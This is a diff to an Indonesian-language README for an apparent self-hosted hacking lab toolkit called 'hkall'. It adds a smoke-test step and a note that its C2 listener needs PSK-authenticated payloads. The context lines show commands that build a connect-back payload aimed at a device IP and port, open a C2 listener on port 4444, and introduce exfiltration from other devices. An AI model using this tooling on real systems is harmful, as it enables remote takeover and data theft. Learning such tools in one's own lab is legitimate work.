@@ -152,7 +152,11 @@ hkall -m toolbox
 
 ## D. Alur belajar lengkap (device sendiri)
 
-1. Nyalakan lab:
+1. Test otomatis dulu (opsional):
+   ```
+   python3 tests/test_smoke.py   # 12 check; exit 1 = ada yang rusak
+   ```
+2. Nyalakan lab:
    ```
    python3 lab/lab_server.py 8090
    ```
@@ -215,6 +219,9 @@ hkall -m payload --host $(IP device ini) --port 8443   # -> data/payload.py
 # di device ini: buka listener
 hkall -m c2 --port 4444
 # payload di device lain connect balik -> session muncul
+# CATATAN: c2 pakai PSK auth (data/c2.psk). Payload HARUS dibangun pakai
+# `hkall -m payload` (PSK embed otomatis). One-liner lama (shell generator)
+# TIDAK bisa konek ke listener karena tanpa PSK — pakai payload hasil build.
 ```
 
 ### Alur exfil dari device lain
